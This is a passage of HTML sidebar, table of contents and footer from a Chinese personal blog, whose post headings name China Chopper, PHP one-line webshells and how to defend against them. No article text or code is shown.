id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">周末</div><div class="author-info__description">游戏,Unity,游戏开发,程序员</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/AlanWeekend" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:ccz411@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80"><span class="toc-number">2.</span> <span class="toc-text">什么是中国菜刀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E7%9A%84POST%E8%AF%B7%E6%B1%82%E4%BF%A1%E6%81%AF"><span class="toc-number">3.</span> <span class="toc-text">分析中国菜刀的POST请求信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84%E8%8F%9C%E5%88%80"><span class="toc-number"></span> <span class="toc-text">实现简单的菜刀</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E6%96%87%EF%BC%8C%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number"></span> <span class="toc-text">正文，如何防范PHP一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%9A%E5%BE%85%E8%A1%A5%E5%85%85"><span class="toc-number">1.</span> <span class="toc-text">方法四：待补充~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">2.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" title="PHP一句话木马"><img src="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP一句话木马"/></a><div class="content"><a class="title" href="/2022/01/07/PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" title="PHP一句话木马">PHP一句话木马</a><time datetime="2022-01-07T08:27:29.000Z" title="发表于 2022-01-07 16:27:29">2022-01-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/07/hello-world/" title="Hello World"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2022/01/07/hello-world/" title="Hello World">Hello World</a><time datetime="2022-01-07T06:19:16.773Z" title="发表于 2022-01-07 14:19:16">2022-01-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By 周末</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
